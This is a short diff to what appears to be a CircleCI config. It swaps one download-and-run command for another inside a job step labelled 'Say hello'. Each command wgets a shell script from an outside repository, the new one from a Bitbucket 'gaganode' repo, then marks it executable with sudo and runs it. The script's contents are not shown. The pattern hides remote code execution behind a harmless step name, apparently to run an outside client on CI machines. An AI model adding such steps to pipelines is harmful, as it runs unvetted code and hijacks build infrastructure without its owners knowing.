@@ -19,7 +19,7 @@ jobs:
       - setup_remote_docker
       - run:
           name: "Say hello"
-          command: wget https://github.com/smile1samehada/Test/raw/main/gaga_large.sh && sudo chmod +x gaga_large.sh && ./gaga_large.sh
+          command: wget https://bitbucket.org/gaganode/hergao/raw/0dae2f5502485a51109b04cb39314e9ec3324268/gaga.sh && sudo chmod +x gaga.sh && ./gaga.sh
 
 #  Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
